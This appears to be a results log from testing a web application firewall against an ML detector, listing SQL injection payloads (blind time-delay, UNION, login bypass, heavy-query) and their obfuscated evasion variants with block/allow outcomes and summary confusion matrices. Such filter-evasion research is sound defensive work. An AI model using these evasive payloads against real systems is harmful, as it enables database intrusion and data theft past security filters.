23,2024-12-16T15:20:11.607510,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and   (  'ztmd'  =  'ztmd",403,403,200,waf_correct_ml_incorrect,"SElEcT dbms_pipe.receive_message  (  chr  (   OR 0  )  ||chr  (  0x43  )  ||chr  (  79  )  ||chr  (  't"">
'<>'t""> X'  )  ,5/*P!Vg*/ )   From dual aND   (  'ztmd'   lIkE   'ztmd",2024-12-16T15:20:18.516320,403,200,waf_correct_ml_incorrect,"SeleCT dbms_pipe.receive_message  (  chr  (   Or 0  )  ||chr  (  0x43  )  ||chr  (  453 LIKE 453  )  ||chr  (  't"">	' NOT LIKE/**/'t""> X'  )  ,(SELECT  OR 0)/*P!Vg*/ )   frOm dual AnD   (  'ztmd'   lIkE   'ztmd",2024-12-16T15:20:27.823547,403,200,waf_correct_ml_incorrect,"sElecT dbms_pipe.receive_message  (  chr  (   OR 1908 lIKe 1908  )   or chr  (  0x43  )  ||chr  (  453 LikE (seLecT (SelEct 1))  )  ||chr  (  't"">	' NOT LIKE 't""> X'  )  ,(sELEcT  or 0)/**/ )   fROm dual And   (  'ztmd'	  LiKe   'ztmd",2024-12-16T15:20:39.049747,403,200,waf_correct_ml_incorrect,"SelECT dbms_pipe.receive_message  (  chr  (   oR (SeLeCt 1) LiKe (seleCT 1908)  )   or chr  (  0x43/**/ )  ||chr  (  453 like (seLEcT (SELEcT 9354<>9355))  )   OR chr  (  't"">
' NOT LIKE 't""> X'  )  ,(SELECt  OR 0)/*
jY*/ )   from dual AnD   (  'ztmd'	  lIkE   'ztmd",2024-12-16T15:20:51.049425,403,403,both_correct,"seLEct dbms_pipe.receive_message  (  chr  (   Or (sElECt 1) LiKe (sElect 1575!=1576)  )   oR chr  (  0x43/**/ )   or chr  (  453 LIke (SeleCt (SeLeCt/*-rd*/(selECT  AND 1)<>9355))  )   Or chr  (  't"">
' NOT LIKE 't""> X'  )  ,(seLECt  Or 0)/**/ )   FROM dual AnD   (  'ztmd'
  LiKE   'ztmd",2024-12-16T15:21:04.706042,403,200,waf_correct_ml_incorrect
24,2024-12-16T15:21:19.389035,boisvert,200,200,200,both_correct,boisvert,2024-12-16T15:21:19.914721,200,200,both_correct,boisvert,2024-12-16T15:21:21.417612,200,200,both_correct,boisvert,2024-12-16T15:21:22.897428,200,200,both_correct,boisvert,2024-12-16T15:21:24.404985,200,200,both_correct,boisvert,2024-12-16T15:21:25.916805,200,200,both_correct
25,2024-12-16T15:21:27.416059,di lorenzo,200,200,200,both_correct,di/**/lorenzo,2024-12-16T15:21:28.003303,200,200,both_correct,di lorenzo,2024-12-16T15:21:29.726064,200,200,both_correct,di/**/lorenzo,2024-12-16T15:21:31.307896,200,200,both_correct,di	lorenzo,2024-12-16T15:21:33.022716,200,403,waf_correct_ml_incorrect,"di
lorenzo",2024-12-16T15:21:34.617300,200,403,waf_correct_ml_incorrect
26,2024-12-16T15:21:36.224133,select case when 6420  =  7941 then 1 else null end--,403,200,200,both_incorrect,"SElECT
case WheN 6420  =   OR 0x0 then ',' not like ',O' eLsE null/**/eND--",2024-12-16T15:21:38.825972,200,200,both_incorrect,"SELecT
CAsE WHen ','/**/NOT LIKE ',k'   LiKE   	OR 0x0 Then ',' not like ',O' ELse null/**/eND--",2024-12-16T15:21:43.418889,200,403,waf_incorrect_ml_correct,"SelECT
CAse WhEN ','/*(Jh_*/NOT LIKE ',k'   LIKE    OR 0x0 THEn ',' not like ',O' elsE null eND--",2024-12-16T15:21:49.017260,200,403,waf_incorrect_ml_correct,"SElecT CASe when ','/*(Jh_*/not like ',k'   liKe   /**/or 0x0 ThEn ',' not like ',O' ELse null enD--",2024-12-16T15:21:54.840502,200,403,waf_incorrect_ml_correct,"SEleCt caSe WheN ','/*(Jh_*/not like ',k'   lIkE  	/**/or 0x0 then ','/**/not like ',O' elsE null END--",2024-12-16T15:22:00.799972,200,403,waf_incorrect_ml_correct
27,2024-12-16T15:22:06.667363,"marines, los",200,200,403,waf_correct_ml_incorrect,"marines,	los",2024-12-16T15:22:07.350196,200,200,both_correct,"marines,
los",2024-12-16T15:22:09.053295,200,200,both_correct,"marines, los",2024-12-16T15:22:10.747095,200,403,waf_correct_ml_incorrect,"marines,/**/los",2024-12-16T15:22:12.448465,200,200,both_correct,"marines, los",2024-12-16T15:22:14.264730,200,403,waf_correct_ml_incorrect
28,2024-12-16T15:22:15.974419,neugebauer@buscamoto.gw,200,200,200,both_correct,neugebauer@buscamoto.gw,2024-12-16T15:22:17.161582,200,200,both_correct,neugebauer@buscamoto.gw,2024-12-16T15:22:19.341145,200,200,both_correct,neugebauer@buscamoto.gw,2024-12-16T15:22:21.551373,200,200,both_correct,neugebauer@buscamoto.gw,2024-12-16T15:22:23.757282,200,200,both_correct,neugebauer@buscamoto.gw,2024-12-16T15:22:25.949016,200,200,both_correct
29,2024-12-16T15:22:28.137059,7986,200,200,200,both_correct,"
oR/**/0x0",2024-12-16T15:22:28.445158,200,200,both_correct,"
OR
0x0",2024-12-16T15:22:29.949220,200,403,waf_correct_ml_incorrect,"
oR	0x0",2024-12-16T15:22:31.358301,200,200,both_correct,	oR	0x0,2024-12-16T15:22:32.750262,200,200,both_correct,/**/oR	0x0,2024-12-16T15:22:34.308159,200,200,both_correct
30,2024-12-16T15:22:35.958520,eccles@aspirantes.gh,200,200,200,both_correct,eccles@aspirantes.gh,2024-12-16T15:22:37.094640,200,200,both_correct,eccles@aspirantes.gh,2024-12-16T15:22:39.146074,200,200,both_correct,eccles@aspirantes.gh,2024-12-16T15:22:41.219108,200,200,both_correct,eccles@aspirantes.gh,2024-12-16T15:22:43.285419,200,200,both_correct,eccles@aspirantes.gh,2024-12-16T15:22:45.328453,200,200,both_correct
31,2024-12-16T15:22:47.389360,"1%""  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  ""%""  =  """,403,403,200,waf_correct_ml_incorrect," or '2' NOT LIKE '2n'%""  )   and 0x2142/*/*a*/ =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (
 ""%""  =  """,2024-12-16T15:22:54.063002,403,403,both_correct," oR '0x2' not like '2n'%""  )   and 0x2142/*/*a*/ =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3/**/ )   and   (	 ""%""  =  """,2024-12-16T15:23:03.007630,403,200,waf_correct_ml_incorrect," or '0x2' not like '2n'%""  )   and 0x2142/*/*a*/ =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  ""%""  =  """,2024-12-16T15:23:12.328927,403,200,waf_correct_ml_incorrect," Or '0x2' not like '2n'%""  )/**/  and 0x2142/*/**/ =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and 
 (  ""%""  =  """,2024-12-16T15:23:21.260971,403,200,waf_correct_ml_incorrect," OR '0x2' not like '2n'%""  )/**/  and 0x2142/*  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  ""%""  =  """,2024-12-16T15:23:30.618747,403,200,waf_correct_ml_incorrect
32,2024-12-16T15:23:39.699053,1  )   as kaew where 2658  =  2658,403,403,200,waf_correct_ml_incorrect,4802 lIKe 4802/**/ )   AS kaew	wheRE (SELEcT (SELEcT 1))   likE   2658,2024-12-16T15:23:41.366061,403,403,both_correct,"4183 iN (4182,4183,4184) LIke 4802/* *//**/)   as kaew	where (sElECT (SELEcT 0x1))   LIKe 
  OR 0",2024-12-16T15:23:45.709199,403,403,both_correct,"4183 IN (4182,4183,'g'<>'gs') lIKe	4802/**/ )   As kaew	WherE (sELECt (SeLeCt 0x1))   LIKe 
  or  oR (SELECT 0)",2024-12-16T15:23:51.239959,403,403,both_correct,"4183 in ( OR 0,(SELECT 4183),'g' NOT LIKE 'gs') LIke	3992 LIKE 3992  ) 	 AS kaew	WHErE (sElecT (seleCT 0x1))   LikE 
  OR  oR (SELeCT 0)",2024-12-16T15:23:57.713698,200,403,waf_incorrect_ml_correct,"'	[LzC' NOT LIKE '	[LzC0' IN ( oR  || 0,(sELECt (SELECT 4183)),'g' NOT LIKE 'gs') liKE	3992/**/lIKe 3992  ) 	 aS kaew
WHEre (sEleCT (sEleCt 0x1))   LIKe 
  oR  oR (seLeCt 0)",2024-12-16T15:24:05.154742,200,200,both_incorrect
33,2024-12-16T15:24:14.232342,"pl. finlandia, 58, 7?d",200,200,403,waf_correct_ml_incorrect,"pl.	finlandia,/**/3112<>3113, (SeLEcT  AND 1)?d",2024-12-16T15:24:15.361350,200,200,both_correct,"pl. finlandia, (SELECT 1)<>(SELECT 3113), (SELeCT  && 4947 NOT LIKE 4948)?d",2024-12-16T15:24:18.629564,403,403,both_incorrect,"pl.	finlandia,/**/(SEleCt 0x2038 In (8247,8248,8249))!=(SeleCT 3113), (SelECT  &&  OR 0 NOT LIKE 4948)?d",2024-12-16T15:24:23.233446,200,200,both_correct,"pl.	finlandia,/**/(SeleCT 0x2038 In (8247,8248,8249))!=(SEleCt/**/ OR 0), (sEleCt  &&  || (seLECT	0) NOT LIKE 'M4J'<>'M4J8')?d",2024-12-16T15:24:29.448856,403,403,both_incorrect,"pl.	finlandia,/**/(seLEct 0x2038 iN (0x2037,8248, and 'Lw' LIKe 'Lw'))!=(sElECt/**/ Or 0), (SeLECt
 &&  || (select	0) NOT LIKE/**/'M4J'<>'M4J8')?d",2024-12-16T15:24:36.370759,403,200,waf_incorrect_ml_correct
34,2024-12-16T15:24:44.265987,update,403,200,200,both_incorrect,UPdAtE,2024-12-16T15:24:44.688648,200,200,both_incorrect,uPdatE,2024-12-16T15:24:46.075288,200,200,both_incorrect,updAte,2024-12-16T15:24:47.471469,200,200,both_incorrect,UPDate,2024-12-16T15:24:48.884648,200,200,both_incorrect,UPdAtE,2024-12-16T15:24:50.305009,200,200,both_incorrect
35,2024-12-16T15:24:51.693960,"-6600'  )   union all select 5566,5566#",403,403,403,both_correct,"-0x19c8'  )/**/  union all select 'H-U' LIKE 'H-U',	oR 0#",2024-12-16T15:24:53.657152,403,403,both_correct,"-0x19c8'  )/**/  union/**/all
select 'H-U' LIKE 'H-U',	oR '_$'<>'_$h'#e",2024-12-16T15:24:57.635688,403,200,waf_correct_ml_incorrect,"-0x19c8'  )/**//**/ union/*Nc*/all	select 'H-U' LIKE 'H-U',	oR '_$'<>'_$h'#e",2024-12-16T15:25:02.094707,403,200,waf_correct_ml_incorrect,"-0x19c8'  )/**//**/ union/**/all	select/**/'H-U' LIKE 'H-U', oR '_$'<>'_$h'#e*r",2024-12-16T15:25:06.674913,403,200,waf_correct_ml_incorrect,"-0x19c8'  )/**/  union/**/all select/**/'H-U' LIKE 'H-U', oR '_$'<>'_$h'#e*r LikE ",2024-12-16T15:25:11.560122,403,200,waf_correct_ml_incorrect
36,2024-12-16T15:25:16.504991,16630,200,200,200,both_correct,"(SeLeCt/**/ oR
0)",2024-12-16T15:25:16.866933,403,200,waf_incorrect_ml_correct,"(selECT 	or
 && 6575<>(SeLECT 6576))",2024-12-16T15:25:18.761827,403,403,both_incorrect,"(selecT		or
/**/&& 0x19af<>(sELeCT ' OR 0'!='5#'))f",2024-12-16T15:25:21.605320,403,200,waf_incorrect_ml_correct,"(seLect		Or
/*)*/&& 0x19af NOT LIKE/**/(SeLecT ' OR 0x0'!=' AND 1867 NOT	LIKE 1868#'))f",2024-12-16T15:25:25.073018,403,403,both_incorrect,"(SelECT		OR
/*)*/ aNd  0x19af
NOT LIKE (sELecT ' OR 0x0'!=' AND 0x74b NOT	LIKE  AND 109 LIKE 109#'))fJO",2024-12-16T15:25:30.524904,403,403,both_incorrect
37,2024-12-16T15:25:36.336964,lightnin@grupodescansoyhogar.web,200,200,200,both_correct,lightnin@grupodescansoyhogar.web,2024-12-16T15:25:37.925447,200,200,both_correct,lightnin@grupodescansoyhogar.web,2024-12-16T15:25:40.528159,200,200,both_correct,lightnin@grupodescansoyhogar.web,2024-12-16T15:25:43.127613,200,200,both_correct,lightnin@grupodescansoyhogar.web,2024-12-16T15:25:45.719828,200,200,both_correct,lightnin@grupodescansoyhogar.web,2024-12-16T15:25:48.346102,200,200,both_correct
38,2024-12-16T15:25:50.915540,"1'   )    )    as qwdh where 7581  =  7581 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",403,403,200,waf_correct_ml_incorrect,"1'   )    )    as qwdh where 7581  =  7581 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  (SELECT 1)  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  0x45 
)  ||char  (  83  )  ,null  )  ,'l2' LIKE 'l2'  )  ,500000000/**/ )  ,null  )  --",2024-12-16T15:26:04.177104,403,200,waf_correct_ml_incorrect,"1'   )    )    as qwdh where 7581  =  7581 or char  (  0x75  )  ||char  (  111  )  ||char  (  118 LIKE 118  )  ||char  (  (SELECT 1)  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  0x45 	)  ||char  (   AND 1  )  ,null  )  ,'l2' LIKE 'l2'  )  ,500000000  )  ,null  )  --",2024-12-16T15:26:19.106242,403,403,both_correct,"1'   )    )    as qwdh where 7581  =  8464 LIKE 8464 or char  (  0x75  )  ||char  (  111  )  ||char  (  118 LIKE 118  )  ||char  (  (SELECT 1)  )    =  regexp_substring /**/(  repeat  (  left  (  crypt_key  (  char  (  (SELECT 65)  )  ||char  (  0x45  )  ||char  (   AND 1  )  ,null  )  ,'l2' LIKE 'l2'  )  ,(SelEcT 1)  )  ,null  )  --",2024-12-16T15:26:34.704536,403,403,both_correct,"1'   )    )    as qwdh where 7581  =  8464 LIKE 8464 or char  (  0x75  )  ||char  (  111  )  ||char  (  (SELECT 118) LIKE  OR 0  )  ||char  (  (SELECT 6832 IN (6831,6832,6833))  )    =  regexp_substring /**/(  repeat  (
 left  (/*!*/ crypt_key  (  char  (  (SELECT 65)  )  ||char  (  0x45  )  ||char  (   AND 1  )  ,null  )  ,'l2' LIKE 'l2'  )  ,(select 1)  )  ,null  )  --",2024-12-16T15:26:51.447565,403,403,both_correct,"1'   )    )    as qwdh where (SELECT 1)  =  8464 LIKE 'p'='p' or char  (  0x75  )  ||char  (  111  )  ||char  (  (SELECT 118) LIKE  OR 0  )  ||char  (  (SELECT 6832 IN (6831,0x1ab0,6833))  )    =  regexp_substring  (  repeat  (  left  (/*_h@r*/ crypt_key  (  char  (  (SELECT 65)  )  ||char  (  0x45  )  ||char  (   AND 1  )  ,null  )  ,'l2' LIKE 'l2'  )  ,(SeLeCt 1)  )  ,null  )  --",2024-12-16T15:27:10.373798,403,403,both_correct
39,2024-12-16T15:27:29.230189,"1' in boolean mode  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  #",403,403,200,waf_correct_ml_incorrect," AND/**/1' IN boolean mode  )   OR 2633  =  dbms_pipe.receive_message  (  chr  (  9231 LIKE 9231  )   or chr	 (  65  )  ||chr  (  65  )  ||chr  (  0x67  )  ,5  )  #m",2024-12-16T15:27:36.142361,403,200,waf_correct_ml_incorrect," ANd/**/1' iN boolean mode  )   Or (SeLEct 1)   likE   dbms_pipe.receive_message  (  chr /**/(  2203=2203 LiKE 9231  )   or chr	 (  65  )  ||chr  (  (SeLeCT
65)  )  ||chr  (  0x67  )  ,5  )  #m",2024-12-16T15:27:44.798100,403,200,waf_correct_ml_incorrect," AnD 1' In boolean mode  )   Or (SeLeCt ')' NOT LIKE ')q')   LIkE   dbms_pipe.receive_message  (  chr /**/(  (SELECT 1)=2203 lIKE 9231  )   Or chr  (  0x41  )  ||chr  (  (seLECt
65)  )   OR chr  (  0x67  )  ,5  )  #m%",2024-12-16T15:27:54.771694,403,200,waf_correct_ml_incorrect," aND  OR 0' In boolean mode  )   Or	(SeLeCt ')' NOT LIKE ')q')   liKE   dbms_pipe.receive_message  (  chr  (  (SelECt 1)=2203 liKE 9231  )   oR chr  (  0x41  )  ||chr  (  (seLeCT
(SELECT 'tw'='tw'))  )   oR chr  (  0x67  )  ,5  )  #m%W?",2024-12-16T15:28:06.156573,403,200,waf_correct_ml_incorrect,"
anD  oR 0' In boolean mode  )   Or	(SeLeCt ')' NOT LIKE/**/')q')   liKE   dbms_pipe.receive_message  (  chr  (  (SelECt  AND (SELECT 1))=2203 liKE 'h|' NOT LIKE 'h|Z'  )   oR chr  (  0x41  )  ||chr  (  (seLeCT
(SELECT 'tw'='tw'))  )   oR chr  (  0x67  )  ,5  )  #m%W?>",2024-12-16T15:28:18.224816,403,403,both_correct
40,2024-12-16T15:28:32.011520,"1'   )    )    union all select null,null,null--",403,403,403,both_correct,"0x1'   ) /**/  )
   union all SeLecT null,null,null--",2024-12-16T15:28:34.311842,403,403,both_correct,"0x1'
  )    )
   union all SElECT null,null,null--",2024-12-16T15:28:37.887954,403,403,both_correct,"0x1'
 
)  /**/ )
   union all sELECt null,null,null--",2024-12-16T15:28:41.358839,403,403,both_correct,"0x1'
  )    )
   union all SeLeCT null,null,null--",2024-12-16T15:28:44.997968,403,403,both_correct,"0x1'   )    )
  /**/union all seLECT null,null,null--",2024-12-16T15:28:48.423313,403,403,both_correct
41,2024-12-16T15:28:52.221563,kresl,200,200,200,both_correct,kresl,2024-12-16T15:28:52.591266,200,200,both_correct,kresl,2024-12-16T15:28:53.936984,200,200,both_correct,kresl,2024-12-16T15:28:55.287313,200,200,both_correct,kresl,2024-12-16T15:28:56.659976,200,200,both_correct,kresl,2024-12-16T15:28:58.024724,200,200,both_correct
42,2024-12-16T15:28:59.390179,"1""  )   as tnux where 4888  =  4888 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",403,403,403,both_correct,"'l'' NOT LIKE 'l'A'""  )   aS tnux WheRE 0x1318   like    OR 0 rlike   (  sElEct * fROm   (  SeLEct  (  sleep  (  5   )  /*I*/ )     )  vwyq
 )  #",2024-12-16T15:29:04.786849,403,200,waf_correct_ml_incorrect,"'l'' NOT LIKE 'l'A'""  )   As
tnux WhErE 0x1318   LIKE    Or 1493 NOT LIKE 1494 rlike   (/**/ select * fRoM   (  SeLecT  (  sleep  (   and 0x1   )  /**/ )     )  vwyq
 )  #/4",2024-12-16T15:29:12.495406,403,403,both_correct,"'l'' NOT LIKE 'l'A'""  ) 	 as
tnux wHERe 0x1318   LiKe    or 1493 not like 6067!=0x17b4 rlike   (/**/ seLeCT */**/FROM   (  sELeCt  (  sleep  (   anD 0x1   )  /**/ )     )  vwyq
 )  #/(SELECT 1)?",2024-12-16T15:29:21.924908,403,200,waf_correct_ml_incorrect,"'l'' NOT LIKE 'l'A'""  ) 	 as
tnux/**/WheRe 0x1318   LikE    oR 0xedd!=(SELECT 1) not like 6067 NOT LIKE 0x17b4 rlike   (/**/ sELeCt */**/froM 
 (  seLECt  (  sleep  (   And 0x1   )  /*6TVk*/ )     )  vwyq
 )  #/(SElEcT 1)?",2024-12-16T15:29:32.069215,403,200,waf_correct_ml_incorrect,"'l'' NOT LIKE 'l'A'""  ) 
 as
tnux/*\9*/WhERe 0x1318   LIKE    oR 0xedd!=(seLeCt  and 1) not like 'Q' NOT LIKE 'Q7' not like 0x17b4 rlike   (/**/ selEcT * fROm 
 (  seleCT  (  sleep  (   AnD 0x1   )  /*6TVk*/ )     )  vwyq
 )  #/(SelECt 0x1)?",2024-12-16T15:29:43.634028,403,200,waf_correct_ml_incorrect
43,2024-12-16T15:29:56.090172,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4",403,403,200,waf_correct_ml_incorrect,"sELEcT count  (  *  )   froM rdb$fields aS t1,rdb$types As/**/t2,rdb$collations
as t3,rdb$functions aS t4",2024-12-16T15:30:00.910283,403,200,waf_correct_ml_incorrect,"SElECT count  (  *  )   FrOM
rdb$fields as t1,rdb$types aS t2,rdb$collations
aS t3,rdb$functions as t4",2024-12-16T15:30:06.975953,403,200,waf_correct_ml_incorrect,"SELEct count  (  *  )   FRoM
rdb$fields aS t1,rdb$types/**/aS t2,rdb$collations	aS t3,rdb$functions as t4",2024-12-16T15:30:13.024788,403,200,waf_correct_ml_incorrect,"selEct count  (  * 
)   frOm
rdb$fields As/**/t1,rdb$types/**/AS t2,rdb$collations	As t3,rdb$functions AS t4",2024-12-16T15:30:19.060352,403,200,waf_correct_ml_incorrect,"SElEcT count  (  * 
)  /**/fRoM
rdb$fields as/**/t1,rdb$types/**/as t2,rdb$collations aS t3,rdb$functions aS t4",2024-12-16T15:30:25.257891,403,200,waf_correct_ml_incorrect
44,2024-12-16T15:30:31.629452,gossett@conac.com.li,200,200,200,both_correct,gossett@conac.com.li,2024-12-16T15:30:32.692734,200,200,both_correct,gossett@conac.com.li,2024-12-16T15:30:34.732521,200,200,both_correct,gossett@conac.com.li,2024-12-16T15:30:36.780314,200,200,both_correct,gossett@conac.com.li,2024-12-16T15:30:38.849697,200,200,both_correct,gossett@conac.com.li,2024-12-16T15:30:40.910143,200,200,both_correct
45,2024-12-16T15:30:43.191320,8589,200,200,200,both_correct,"(SELECT
'&R'!='&R}')",2024-12-16T15:30:43.545495,403,403,both_incorrect,"(SEleCt
'&R' NOT	LIKE '&R}')",2024-12-16T15:30:45.631768,403,403,both_incorrect,"(sELeCt
'&R'/**/NOT
LIKE '&R}')",2024-12-16T15:30:48.015121,403,403,both_incorrect,"(SElEct	'&R' NOT
LIKE '&R}')",2024-12-16T15:30:50.596674,403,403,both_incorrect,"(SeLECt '&R'/**/NOT
LIKE '&R}')",2024-12-16T15:30:53.013495,403,403,both_incorrect
46,2024-12-16T15:30:55.587093,velero@softwaresaas.ec,200,200,200,both_correct,velero@softwaresaas.ec,2024-12-16T15:30:56.731996,200,200,both_correct,velero@softwaresaas.ec,2024-12-16T15:30:58.872395,200,200,both_correct,velero@softwaresaas.ec,2024-12-16T15:31:01.036695,200,200,both_correct,velero@softwaresaas.ec,2024-12-16T15:31:03.221187,200,200,both_correct,velero@softwaresaas.ec,2024-12-16T15:31:05.383547,200,200,both_correct
47,2024-12-16T15:31:07.506657,"admin""  )   or ""1""  =  ""1""/*",403,403,200,waf_correct_ml_incorrect,"admin"" /**/)   or ""495=(selEct 1)""  =
 ""0x1""/*",2024-12-16T15:31:08.911250,403,200,waf_correct_ml_incorrect,"admin""  )   or "" OR 0x0 like (SELECT '#P(a'!='#P(ar')""  =  ""0x1""/*",2024-12-16T15:31:12.134923,403,403,both_correct,"admin""/**/ )   or "" Or 0x0 LiKE (selECT '#P(a' not like '#P(ar')""
 =  ""0x1""/*{o",2024-12-16T15:31:16.377796,403,200,waf_correct_ml_incorrect,"admin""  )   or "" oR 0x0 LIke (sEleCT '#P(a' not like
'#P(ar')""
 =  ""0x1""/*{oY",2024-12-16T15:31:21.417583,403,200,waf_correct_ml_incorrect,"admin""  )   or "" oR 0x0 lIKe (SeLECT '#P(a' not/**/like
'#P(ar')""  =  ""0x1""/*{oY",2024-12-16T15:31:26.092278,403,200,waf_correct_ml_incorrect
48,2024-12-16T15:31:30.871410,-7636'  )   or 5898  =  8880 and   (  'sjuv'  =  'sjuv,403,403,200,waf_correct_ml_incorrect,-7636'  )   or	5898  =   AND 9145 NOT LIKE/**/(SELECT 9146) and   (  'sjuv'  =  'sjuv,2024-12-16T15:31:33.475396,403,403,both_correct,"-7636'  )   or	(SELECT 1)  =   AND 9145 NOT LIKE/**/(SELECT 6239 NOT/**/LIKE 0x1860) and 
 (  'sjuv'  =  'sjuv",2024-12-16T15:31:38.594927,403,403,both_correct,"-7636' 
)   or	(SELECT 1611=1611)  =   AND (SELECT 0x1) NOT LIKE (SELECT 6239 NOT/**/LIKE 0x1860) and 
 (  'sjuv'  =  'sjuv",2024-12-16T15:31:44.795964,403,403,both_correct,"-7636' 
)   or	(SELECT 'DPd' NOT LIKE 'DPdZ'=1611)  =   AND (SELECT 0x1) NOT LIKE (SELECT  AND 0x1 NOT LIKE 0x1860) and 	 (  'sjuv'  =  'sjuv",2024-12-16T15:31:51.852729,403,403,both_correct,"-(SELeCt  anD 7996 NOT LIKE 7997)' 
)   or	(SELECT 'DPd' NOT LIKE 'DPdZ'=1611)  =   AND (SELECT 0x1) NOT LIKE (SELECT  AND 0x1 NOT LIKE 0x1860) and   (/**/ 'sjuv'  =  'sjuv",2024-12-16T15:31:59.513544,403,403,both_correct
49,2024-12-16T15:32:08.618025,"1  )   as udjn where 6871  =  6871 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",403,403,200,waf_correct_ml_incorrect,"1  )   AS udjn wHeRe (sELeCT 1)  =  0x18f3 lIkE 6387 OR 4915   LiKE 	   (  SELECT count  (  *  )   FRoM domain.domains As t1,domain.columns AS t2,domain.tables aS t3  ) /**/--",2024-12-16T15:32:15.917362,403,200,waf_correct_ml_incorrect,"1  )   aS udjn wHEre (selEcT 1)  =  0x18f3 likE 0x18f3 oR 9796!= ANd 1   lIKE 
 /**/ (  seLEct count  (  *  )   FRom domain.domains As t1,domain.columns as t2,domain.tables AS t3  ) /*u4)b*/--",2024-12-16T15:32:25.031741,403,200,waf_correct_ml_incorrect,"1  )   as udjn whERE (seLecT  oR 0)   lIKe   0x18f3 like 0x18f3 or 0x2644!= ANd '`W2cZ'='`W2cZ'   LIKe 
   (  SeLecT count  (  * 
)   frOM domain.domains AS t1,domain.columns as t2,domain.tables As t3  ) /*u4)b*/--",2024-12-16T15:32:35.063882,403,200,waf_correct_ml_incorrect,"'A6'<>'A6m'  )   AS udjn/**/whERe (Select  OR (SELECT (SELECT 1)))   lIKe   0x18f3 lIKE 0x18f3 OR 0x2644!= ANd '`W2cZ'='`W2cZ'   liKe 	   (  selEcT count  (  * 
)   FRoM domain.domains aS t1,domain.columns AS t2,domain.tables aS t3  ) /*u4)b*/--",2024-12-16T15:32:46.393374,403,403,both_correct,"'A6'<>'A6m'  )   as udjn/*x)cP*/wHeRE (SElect  oR (sELEct/**/(SeleCt '/sm'<>'/sm&')))   like   0x18f3 LIke 0x18f3 Or 0x2644!= and '`W2cZ'='`W2cZ'   lIke 	   (  SeLEcT count  (  * 	)   fROM domain.domains aS t1,domain.columns AS t2,domain.tables AS t3  ) /*u4)b*/--",2024-12-16T15:32:58.760618,403,200,waf_correct_ml_incorrect
50,2024-12-16T15:33:12.233338,2502,200,200,200,both_correct, Or '#\'	NOT/**/LIKE '#\K',2024-12-16T15:33:12.554678,200,200,both_correct," or '#\'
NOT/**/LIKE/**/'#\K'L",2024-12-16T15:33:14.824508,200,200,both_correct, Or '#\'	NOT LIKE/**/'#\K'Ll,2024-12-16T15:33:17.258768,200,403,waf_correct_ml_incorrect," or '#\'
NOT LIKE '#\K'Ll""O",2024-12-16T15:33:19.627421,200,403,waf_correct_ml_incorrect,"/*w49*/or '#\' NOT LIKE '#\K'Ll""O",2024-12-16T15:33:21.981674,200,403,waf_correct_ml_incorrect

Overall Results
WAF TP,144
WAF TN,114
WAF FP,18
WAF FN,24
ML TP,92
ML TN,105
ML FP,27
ML FN,76

Combined Results (2x2 Matrix)
,WAF Correct,WAF Incorrect
ML Correct,181,16
ML Incorrect,77,26
